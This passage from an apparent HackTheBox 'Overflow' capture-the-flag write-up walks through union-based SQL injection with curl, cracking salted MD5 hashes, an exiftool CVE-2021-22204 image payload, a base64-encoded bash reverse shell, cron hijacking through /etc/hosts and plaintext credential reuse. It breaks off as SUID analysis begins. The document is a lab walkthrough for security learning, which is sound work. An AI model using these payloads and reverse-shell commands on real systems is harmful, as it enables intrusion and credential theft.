 &lt;div id='last'&gt;Last login : 11:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 14:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 16:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 10:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 12:00:00&lt;/div&gt;&lt;br&gt;  

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=admin'"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=admin'--+-"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=admin')--+-"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>
 &lt;div id='last'&gt;Last login : 11:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 14:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 16:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 10:00:00&lt;/div&gt;&lt;br&gt; &lt;div id='last'&gt;Last login : 12:00:00&lt;/div&gt;&lt;br&gt;
</code></pre></div><p>Now we can detect it is a Union-based SQLi on the third column:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=')+union+select+('1"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=')+union+select+1,('2"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=')+union+select+1,2,('3"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>  
 &lt;div id='last'&gt;Last login : 3&lt;/div&gt;&lt;br&gt;
</code></pre></div><p>At this point, we can extract information from the database, such as:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=')+union+select+1,2,(select+version()+order+by+'1"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>
 &lt;div id='last'&gt;Last login : 5.7.35-0ubuntu0.18.04.2&lt;/div&gt;&lt;br&gt;

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=')+union+select+1,2,(select+user()+order+by+'1"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>
 &lt;div id='last'&gt;Last login : developer@localhost&lt;/div&gt;&lt;br&gt;

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=')+union+select+1,2,(select+database()+order+by+'1"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>  
 &lt;div id='last'&gt;Last login : logs&lt;/div&gt;&lt;br&gt;
</code></pre></div><h2 id="exploiting-sqli">Exploiting SQLi</h2><p>To make the extraction easier, let&rsquo;s create a custom script in Ruby called <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Overflow/sqli.rb"><code>sqli.rb</code></a> (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Overflow#sqlirb">here</a>).</p><p>The script is designed to be run by steps. First we must enumerate the existing databases:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --get-dbs
[*] Number of databases: 4.  

information_schema
Overflow
cmsmsdb
logs
</code></pre></div><p>Now, we must enumerate tables inside each database. Let&rsquo;s start with <code>Overflow</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db Overflow --get-tables  
[*] Number of tables in Overflow: 1.

users
</code></pre></div><p>There is only one table called <code>users</code>. Now we can list its columns:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db Overflow --table users --get-columns  
[*] Number of columns in Overflow.users: 2.

username
password
</code></pre></div><p>And finally, get the contents of both columns:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db Overflow --table users --columns username,password  
[*] Number of rows in Overflow.users: 1.

+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | c71d60439ed5590b3c5e99d95ed48165 |
+----------+----------------------------------+
</code></pre></div><p>We have got a password hash. Just in case, we must examine the database called <code>logs</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db logs --get-tables
[*] Number of tables in logs: 1.

userlog

<span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db logs --table userlog --get-columns  
[*] Number of columns in logs.userlog: 3.

id
USERNAME
Lastlogin
</code></pre></div><p>And there is nothing interesting at all. Finally, we must analyze the database called <code>cmsmsdb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db cmsmsdb --get-tables  
[*] Number of tables in cmsmsdb: 47.

cms_additional_users
cms_additional_users_seq
cms_admin_bookmarks
cms_admin_bookmarks_seq
cms_adminlog
cms_content
cms_content_props
cms_content_props_seq
cms_content_seq
...
cms_routes
cms_siteprefs
cms_user_groups
cms_userplugins
cms_userplugins_seq
cms_userprefs
cms_users
cms_users_seq
cms_version
</code></pre></div><p>There are a lot of tables. The most interesting one is <code>cms_users</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db cmsmsdb --table cms_users --get-columns  
[*] Number of columns in cmsmsdb.cms_users: 10.

user_id
username
password
admin_access
first_name
last_name
email
active
create_date
modified_date
</code></pre></div><p>From this table, it seems that <code>username</code> and <code>password</code> will be useful:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db cmsmsdb --table cms_users --columns user_id,username,password,admin_access  
[*] Number of rows in cmsmsdb.cms_users: 2.

+---------+----------+----------------------------------+--------------+
| user_id | username | password                         | admin_access |
+---------+----------+----------------------------------+--------------+
| 1       | admin    | c6c6b9310e0e6f3eb3ffeb2baff12fdd | 1            |
| 3       | editor   | e3d748d58b58657bfa4dffe2def0b1c7 | 1            |
+---------+----------+----------------------------------+--------------+
</code></pre></div><p>If we try to crack these hashes (and the one found before), they are not crackable using <code>rockyou.txt</code>. Here we must recall that the exploit from ExploitDB was using a salt that was stored in the database (specifically, in a table called <code>cms_siteprefs</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db cmsmsdb --table cms_siteprefs --get-columns
[*] Number of columns in cmsmsdb.cms_siteprefs: 4.

sitepref_name
sitepref_value
create_date
modified_date

<span class="code-cyan">$</span> <span class="code-dark-green">ruby</span> sqli.rb --db cmsmsdb --table cms_siteprefs --columns sitepref_name,sitepref_value | head -7  
[*] Number of rows in cmsmsdb.cms_siteprefs: 37.

+---------------+------------------+
| sitepref_name | sitepref_value   |
+---------------+------------------+
| sitemask      | 6c2d17f37e226486 |
+---------------+------------------+
</code></pre></div><p>And here we have the salt, now we can crack the hashes. For this purpose, I decided to use a simple Python script:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span> <span class="mtk8 mtku">hashlib</span>

<span class="mtk1">salt</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'6c2d17f37e226486'</span>
<span class="mtk1">wordlist</span> <span class="mtk5">=</span> <span class="mtk4">'rockyou.txt'</span>

<span class="mtk7 mtki">def</span> <span class="mtk8">crack</span><span class="mtk1">(</span><span class="mtk9 mtki">md5_hash</span><span class="mtk1">):</span>
    <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'[+]</span> <span class="mtk4">Cracking</span> <span class="mtk4">hash:'</span><span class="mtk1">,</span> <span class="mtk9 mtki">md5_hash</span><span class="mtk1">)</span>
    <span class="mtk5">with</span> <span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk1">wordlist</span><span class="mtk1">,</span> <span class="mtk4">'rb'</span><span class="mtk1">)</span> <span class="mtk5">as</span> <span class="mtk1">f</span><span class="mtk1">:</span>
        <span class="mtk5">for</span> <span class="mtk1">line</span> <span class="mtk5">in</span> <span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">read</span><span class="mtk1">().</span><span class="mtk8">splitlines</span><span class="mtk1">():</span>
            <span class="mtk5">if</span> <span class="mtk8 mtku">hashlib</span><span class="mtk1">.</span><span class="mtk8">md5</span><span class="mtk1">(</span><span class="mtk1">salt</span> <span class="mtk5">+</span> <span class="mtk1">line</span><span class="mtk1">).</span><span class="mtk8">hexdigest</span><span class="mtk1">()</span> <span class="mtk5">==</span> <span class="mtk9 mtki">md5_hash</span><span class="mtk1">:</span>
                <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'[*]</span> <span class="mtk4">Password</span> <span class="mtk4">hash</span> <span class="mtk4">cracked:'</span><span class="mtk1">,</span> <span class="mtk1">line</span><span class="mtk1">.</span><span class="mtk8">decode</span><span class="mtk1">())</span>  
                <span class="mtk5">break</span>

<span class="mtk8">crack</span><span class="mtk1">(</span><span class="mtk4">'c6c6b9310e0e6f3eb3ffeb2baff12fdd'</span><span class="mtk1">)</span>
<span class="mtk8">crack</span><span class="mtk1">(</span><span class="mtk4">'e3d748d58b58657bfa4dffe2def0b1c7'</span><span class="mtk1">)</span>
<span class="mtk8">crack</span><span class="mtk1">(</span><span class="mtk4">'c71d60439ed5590b3c5e99d95ed48165'</span><span class="mtk1">)</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> crack.py
[+] Cracking hash: c6c6b9310e0e6f3eb3ffeb2baff12fdd  
[+] Cracking hash: e3d748d58b58657bfa4dffe2def0b1c7
[*] Password hash cracked: alpha!@#$%bravo
[+] Cracking hash: c71d60439ed5590b3c5e99d95ed48165
</code></pre></div><p>And we have got the password for user <code>editor</code>: <code>alpha!@#$%bravo</code>.</p><h2 id="foothold-on-the-machine">Foothold on the machine</h2><p>These credentials are valid for the CMS, we have access to the administration panel:</p><p><img src="/images/HTB/Overflow/Overflow-cms-admin.png" alt="Overflow CMS admin"></p><p>In the footer we can see that the CMS version is CMS Made Simple 2.2.8. This is useful to find exploits. There is an RCE exploit (<a href="https://www.exploit-db.com/exploits/49345"><code>49345</code></a>) defining a new tag in the &ldquo;Extensions&rdquo; section. If we go there, we find this message:</p><p><img src="/images/HTB/Overflow/Overflow-cms-subdomain.png" alt="Overflow CMS subdomain"></p><p>There is another subdomain called <code>devbuild-job.overflow.htb</code>.</p><p>Before enumerating this subdomain, we try to follow the actions listed in the exploit to gain Remote Code Execution (RCE), but without success. Therefore, it seems there is nothing more to do here.</p><p>If we go to <code>http://devbuild-job.overflow.htb</code> we will see a login form:</p><p><img src="/images/HTB/Overflow/Overflow-devbuild-login.png" alt="Overflow DevBuild login"></p><p>The message of the CMS said to login here with the same credentials, so let&rsquo;s use again <code>editor:alpha!@#$%bravo</code>:</p><p><img src="/images/HTB/Overflow/Overflow-devbuild-index.png" alt="Overflow DevBuild index"></p><p>It seems that there is a lot to do here, but do not panic. Most of the buttons and links are disabled. Actually, the website only has one functionality, which is at the &ldquo;Account&rdquo; section:</p><p><img src="/images/HTB/Overflow/Overflow-devbuild-upload.png" alt="Overflow DevBuild upload"></p><p>We are able to upload images to the server, but in a peculiar way. If we analyze the response using Burp Suite (Repeater), we see a strange response:</p><p><img src="/images/HTB/Overflow/Overflow-burp-suite-exiftool.png" alt="Overflow Burp Suite exiftool"></p><p>The response contains the output of running <code>exiftool</code> to extract the metadata of the uploaded image.</p><p>The version of <code>exiftool</code> is shown in the response body (11.92). There is a Remote Code Execution (RCE) vulnerability for <code>exiftool</code> below version 12.24 (CVE-2021-22204).</p><p>Following the steps shown in <a href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/">this blogpost</a>, we are able to get RCE on the machine.</p><p>To craft the exploiting image, we must install <code>djvumake</code>. These instructions are shown in the blogpost:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">vim</span> payload

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> payload
(metadata "\c${system('id')};")

<span class="code-cyan">$</span> <span class="code-dark-green">bzz</span> payload payload.bzz

<span class="code-cyan">$</span> <span class="code-dark-green">djvumake</span> exploit.jpg INFO=<span class="code-dark-yellow">'1,1'</span> BGjp=/dev/null ANTz=payload.bzz  
</code></pre></div><p>Now if we upload <code>exploit.jpg</code>, we will see the output of the command <code>id</code> in the response:</p><p><img src="/images/HTB/Overflow/Overflow-burp-suite-exiftool-exploit.png" alt="Overflow DevBuild exiftool exploit"></p><p>Once we have got RCE, we can obtain access to the machine using a reverse shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx

<span class="code-cyan">$</span> <span class="code-dark-green">vim</span> payload

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> payload
(metadata "\c${system('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash')};")  

<span class="code-cyan">$</span> <span class="code-dark-green">bzz</span> payload payload.bzz

<span class="code-cyan">$</span> <span class="code-dark-green">djvumake</span> exploit.jpg INFO=<span class="code-dark-yellow">'1,1'</span> BGjp=/dev/null ANTz=payload.bzz
</code></pre></div><p>Now we upload <code>exploit.jpg</code> and get a connection in <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.119.
Ncat: Connection from 10.10.11.119:44332.
bash: cannot set terminal process group (1019): Inappropriate ioctl for device  
bash: no job control in this shell
www-data@overflow:~/devbuild-job/home/profile$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@overflow:~/devbuild-job/home/profile$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@overflow:~/devbuild-job/home/profile$ export TERM=xterm
www-data@overflow:~/devbuild-job/home/profile$ export SHELL=bash
www-data@overflow:~/devbuild-job/home/profile$ stty rows 50 columns 158
</code></pre></div><h2 id="lateral-movement-to-developer">Lateral movement to <code>developer</code></h2><p>There are two users in <code>/home</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@overflow:~/devbuild-job/home/profile$ cd  
www-data@overflow:~$ pwd
/var/www
www-data@overflow:~$ ls /home
developer  tester
</code></pre></div><p>The <code>user.txt</code> flag is in <code>/home/tester</code>, and we need to be <code>tester</code> to actually read it. Hence, we must perform a lateral movement to user <code>tester</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@overflow:~$ find / -name user.txt 2&gt;/dev/null
/home/tester/user.txt
www-data@overflow:~$ ls -l /home/tester/user.txt
-rw-r----- 1 root tester 33 Dec 31 14:28 /home/tester/user.txt  
</code></pre></div><p>As <code>www-data</code> we can read the PHP source code. Let&rsquo;s look for clear text credentials:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@overflow:~$ ls -la
total 16
drwxr-xr-x  4 root     root 4096 Sep 17 21:56 .
drwxr-xr-x 14 root     root 4096 Sep 17 21:56 ..
drwxr-xr-x  5 www-data root 4096 Sep 29 22:03 devbuild-job
drwxr-xr-x  6 www-data root 4096 Sep 29 02:31 html
www-data@overflow:~$ ls -la html
total 56
drwxr-xr-x 6 www-data root  4096 Sep 29 02:31 .
drwxr-xr-x 4 root     root  4096 Sep 17 21:56 ..
drwxr-xr-x 9 www-data root  4096 Sep 29 20:12 admin_cms_panel
drwxr-xr-x 5 www-data root  4096 Sep 29 02:38 assets
drwxr-xr-x 2 www-data root  4096 Sep 29 20:12 config
drwxr-xr-x 3 www-data root  4096 Sep 29 02:44 home
-rwxr-xr-x 1 www-data root 12406 Sep 29 02:24 index.php
-rwxr-xr-x 1 www-data root  2773 Sep 29 02:30 login.php
-rwxr-xr-x 1 www-data root   269 May 26  2021 logout.php
-rwxr-xr-x 1 www-data root  4251 Sep 29 02:31 register.php
www-data@overflow:~$ ls -la html/config
total 24
drwxr-xr-x 2 www-data root 4096 Sep 29 20:12 .
drwxr-xr-x 6 www-data root 4096 Sep 29 02:31 ..
-rw-r--r-- 1 root     root  418 May 25  2021 admin_last_login.js  
-rwxr-xr-x 1 www-data root  391 May 18  2021 auth.php
-rwxr-xr-x 1 www-data root  315 May 28  2021 db.php
-rwxr-xr-x 1 www-data root 3287 May 28  2021 users.php
www-data@overflow:~$ cat html/config/db.php
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>

<span class="mtk3">#define('DB_Server',</span> <span class="mtk3">'localhost');</span>
<span class="mtk3">#define('DB_Username',</span> <span class="mtk3">'root');</span>
<span class="mtk3">#define('DB_Password',</span> <span class="mtk3">'root');</span>
<span class="mtk3">#define('DB_Name',</span> <span class="mtk3">'Overflow');</span>

<span class="mtk1">$lnk</span> <span class="mtk5">=</span> <span class="mtk7">mysqli_connect</span><span class="mtk1">(</span><span class="mtk4">"localhost"</span><span class="mtk1">,</span> <span class="mtk4">"developer"</span><span class="mtk1">,</span> <span class="mtk4">"sh@tim@n"</span><span class="mtk1">,</span> <span class="mtk4">"Overflow"</span><span class="mtk1">);</span>  
<span class="mtk1">$db</span> <span class="mtk5">=</span> <span class="mtk7">mysqli_select_db</span><span class="mtk1">($lnk,</span> <span class="mtk4">"Overflow"</span><span class="mtk1">);</span>

<span class="mtk5">if</span> <span class="mtk1">($db</span> <span class="mtk5">==</span> <span class="mtk6">false</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk7">dir</span><span class="mtk1">(</span><span class="mtk4">'Cannot</span> <span class="mtk4">Connect</span> <span class="mtk4">to</span> <span class="mtk4">Database'</span><span class="mtk1">);</span>
<span class="mtk1">}</span>

<span class="mtk5">?&gt;</span>
</code></pre></div><p>And there is a password for user <code>developer</code> in MySQL. Luckily, if we try to switch user to <code>developer</code> using <code>sh@tim@n</code> as password, we get access as <code>developer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@overflow:~$ su developer  
Password:
$ echo $0
sh
$ bash
developer@overflow:/var/www$
</code></pre></div><p>Notice that we entered in a <code>/bin/sh</code> instead of <code>/bin/bash</code>.</p><h2 id="lateral-movement-to-tester">Lateral movement to <code>tester</code></h2><p>User <code>developer</code> belongs to a group called <code>network</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@overflow:/var/www$ id
uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(network)  
</code></pre></div><p>The members of this group are able to modify <code>/etc/hosts</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@overflow:/var/www$ find / -group network 2&gt;/dev/null  
/etc/hosts
developer@overflow:/var/www$ ls -l /etc/hosts
-rwxrw-r-- 1 root network 201 Jan  1 08:20 <span class="code-green">/etc/hosts</span>
</code></pre></div><p>With this permission, we are able to add subdomains to the local DNS of the machine (that is, the file <code>/etc/hosts</code>).</p><p>Since we need to become <code>tester</code>, let&rsquo;s see if this user has any interesting files:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@overflow:/var/www$ find / -user tester 2&gt;/dev/null | grep -v proc  
/home/tester
/home/tester/.cache
/home/tester/.ssh
/home/tester/.profile
/home/tester/.gnupg
/var/mail/tester
/opt/commontask.sh
</code></pre></div><p>There is a Bash script in <code>/opt/commontask.sh</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@overflow:/var/www$ cat /opt/commontask.sh  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>

<span class="mtk3">#make</span> <span class="mtk3">sure</span> <span class="mtk3">its</span> <span class="mtk3">running</span> <span class="mtk3">every</span> <span class="mtk3">minute.</span>


<span class="mtk1">bash</span> <span class="mtk5">&lt;</span> <span class="mtk4">&lt;(curl</span> <span class="mtk4">-s</span> <span class="mtk4 detected-link">http://taskmanage.overflow.htb/task.sh</span><span class="mtk4">)</span>
</code></pre></div><p>It seems to contain a Cron job that requests a file called <code>task.sh</code> from <code>http://taskmanage.overflow.htb</code> and inputs it to Bash.</p><p>In this point, we must add a subdomain called <code>taskmanage.overflow.htb</code> into the machine&rsquo;s <code>/etc/hosts</code> pointing to our IP address. Then, we must serve a file called <code>task.sh</code> so that it is downloaded and executed with Bash:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">developer@overflow:/var/www$ vim /etc/hosts
developer@overflow:/var/www$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       overflow        overflow.htb

10.10.17.44     taskmanage.overflow.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">vim</span> task.sh

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> task.sh
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>

<span class="mtk7">echo</span> <span class="mtk1">YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NC</span><span class="mtk1">AwPiYx</span> <span class="mtk5">|</span> <span class="mtk1">base64</span> <span class="mtk1">-d</span> <span class="mtk5">|</span> <span class="mtk1">bash</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.119 - - [] "GET /task.sh HTTP/1.1" 200 -  
</code></pre></div><p>And if we were listening with <code>nc</code>, we get access as <code>tester</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.119.
Ncat: Connection from 10.10.11.119:44534.
bash: cannot set terminal process group (7907): Inappropriate ioctl for device  
bash: no job control in this shell
tester@overflow:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tester@overflow:~$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
tester@overflow:~$ export TERM=xterm
tester@overflow:~$ export SHELL=bash
tester@overflow:~$ stty rows 50 columns 158
</code></pre></div><p>At this point, we can capture the <code>user.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ cat user.txt
9248cf7d566c232e4618be372f16fe38  
</code></pre></div><h2 id="analizing-a-suid-binary">Analizing a SUID binary</h2><p>Now that we are <code>tester</code>, we can check for SUID binaries:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ find / -perm -4000 2&gt;/dev/null
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/bin/ping
/bin/su
/bin/umount
/bin/mount
/bin/fusermount
/opt/file_encrypt/file_encrypt
tester@overflow:~$ ls -l /opt/file_encrypt/file_encrypt
-rwsr-xr-x 1 root root 11904 May 31  2021 <span class="code-white code-bg-red">/opt/file_encrypt/file_encrypt</span>  
</code></pre></div><p>There is one that might be interesting: <code>/opt/file_encrypt/file_encrypt</code>. Let&rsquo;s see what it does:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ file /opt/file_encrypt/file_encrypt
